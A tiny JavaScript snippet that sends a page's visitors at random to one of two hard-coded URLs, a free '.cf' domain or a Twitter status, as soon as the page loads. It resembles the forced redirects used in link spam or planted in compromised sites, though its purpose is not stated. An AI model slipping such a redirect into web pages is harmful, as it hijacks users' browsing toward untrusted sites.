var urls = new Array();
urls[0] = "http://urlreturns.cf/golek";
urls[1] = "https://twitter.com/jar1tengah/status/1108005995530207233";

var random = Math.floor(Math.random()*urls.length);

window.location = urls[random];
